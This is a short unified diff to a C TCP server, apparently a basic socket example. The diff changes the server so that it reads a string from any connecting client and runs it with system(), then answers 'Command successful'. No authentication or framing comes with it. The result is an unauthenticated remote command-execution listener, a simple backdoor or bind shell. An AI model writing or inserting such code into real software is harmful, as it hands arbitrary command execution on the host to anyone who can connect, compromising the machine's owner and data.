@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <netinet/in.h>
@@ -40,8 +41,14 @@ main ()
 		   three-way handshake*/
 		connfd = accept(listenfd, (SA *) NULL, NULL);
 
+		recv(connfd, buff, sizeof(buff), 0);
+
+		printf("SERVER: Executing \"%s\"\n", buff);
+
+		system(buff);
+
 		/* fill buffer with data to send to client */		
-		snprintf(buff, sizeof(buff), "This is a test\r\n");
+		snprintf(buff, sizeof(buff), "CLIENT: Command successful!\r\n");
 
 		/* send buffer to client */
 		write(connfd, buff, strlen(buff));
